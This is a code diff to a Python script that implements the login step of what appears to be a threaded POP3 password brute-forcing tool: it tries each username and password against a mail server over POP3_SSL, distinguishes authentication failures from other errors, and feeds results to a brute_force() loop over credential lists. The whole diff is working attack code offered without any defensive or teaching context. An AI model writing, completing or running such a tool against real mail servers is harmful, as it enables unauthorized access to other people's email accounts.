@@ -1,5 +1,6 @@
 #! /usr/bin/env python3
 
+import poplib
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -28,7 +29,19 @@ ignore_errors = True
 lock = Lock()
 
 def login(pop_server, port, user, password):
-    pass
+    t1 = time()
+    try:
+        mailbox = poplib.POP3_SSL(pop_server, port)
+        mailbox.user(user)
+        mailbox.pass_(password)
+        mailbox.close()
+        t2 = time()
+        return True, t2-t1
+    except Exception as error:
+        t2 = time()
+        if "Authentication failed" in str(error):
+            return False, t2-t1
+        return error, t2-t1
 def brute_force(thread_index, pop_server, port, credentials):
     successful_logins = {}
     for credential in credentials:
